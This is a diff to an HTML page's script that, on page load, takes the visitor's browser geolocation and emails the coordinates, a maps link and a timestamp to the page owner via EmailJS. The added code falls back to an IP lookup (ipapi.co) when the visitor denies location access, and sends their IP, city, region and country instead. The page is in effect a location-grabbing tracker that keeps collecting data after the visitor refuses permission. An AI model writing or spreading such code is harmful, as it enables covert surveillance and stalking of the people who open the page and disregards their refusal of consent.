@@ -8,38 +8,106 @@
     <script>
       // Initialize with your Public Key
       emailjs.init("NVCMR19a2I2K3EGeL");
+      function sendLocationViaEmail(payload) {
+        const mapsUrl =
+          payload.latitude && payload.longitude
+            ? `https://maps.google.com/?q=${payload.latitude},${payload.longitude}`
+            : "";
 
-      // Auto-send location when page loads
+        const templateParams = {
+          location:
+            payload.latitude && payload.longitude
+              ? `${payload.latitude}, ${payload.longitude}`
+              : payload.city || "unknown",
+          maps_link: mapsUrl,
+          method: payload.method || "unknown",
+          ip: payload.ip || "",
+          city: payload.city || "",
+          region: payload.region || "",
+          country: payload.country || "",
+          timestamp: new Date().toString(),
+        };
+
+        return emailjs.send(
+          "service_ysz75sc",
+          "template_0aez2ve",
+          templateParams,
+        );
+      }
+
+      // Try precise browser geolocation first, then fall back to IP-based lookup
       window.addEventListener("load", function () {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             function (position) {
               const lat = position.coords.latitude;
               const lng = position.coords.longitude;
-              const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
 
-              // Send email
-              emailjs
-                .send("service_ysz75sc", "template_0aez2ve", {
-                  location: `${lat}, ${lng}`,
-                  maps_link: mapsUrl,
-                  timestamp: new Date().toString(),
+              sendLocationViaEmail({
+                latitude: lat,
+                longitude: lng,
+                method: "geolocation",
+              })
+                .then(function () {
+                  alert("Precise location sent.");
                 })
-                .then(
-                  function (response) {
-                    alert("Location sent!");
-                  },
-                  function (error) {
-                    alert("Failed to send: " + JSON.stringify(error));
-                  },
-                );
+                .catch(function (err) {
+                  console.error("Email send failed (geolocation):", err);
+                });
             },
             function (error) {
-              alert("Location access denied.");
+              console.warn("Geolocation failed or denied:", error);
+              // Fallback to IP-based geolocation
+              fetch("https://ipapi.co/json/")
+                .then((res) => res.json())
+                .then((data) => {
+                  sendLocationViaEmail({
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    method: "ip-fallback",
+                  })
+                    .then(function () {
+                      alert("Approximate location sent (IP fallback).");
+                    })
+                    .catch(function (err) {
+                      console.error("Email send failed (ip fallback):", err);
+                    });
+                })
+                .catch((err) => {
+                  console.error("IP geolocation failed:", err);
+                });
             },
+            { timeout: 10000 },
           );
         } else {
-          alert("Geolocation not supported");
+          console.warn("Geolocation not supported; using IP lookup");
+          // Geolocation not supported — use IP lookup
+          fetch("https://ipapi.co/json/")
+            .then((res) => res.json())
+            .then((data) => {
+              sendLocationViaEmail({
+                latitude: data.latitude,
+                longitude: data.longitude,
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                method: "ip-only",
+              })
+                .then(function () {
+                  alert("Approximate location sent (IP).");
+                })
+                .catch(function (err) {
+                  console.error("Email send failed (ip):", err);
+                });
+            })
+            .catch((err) => {
+              console.error("IP geolocation failed:", err);
+            });
         }
       });
     </script>
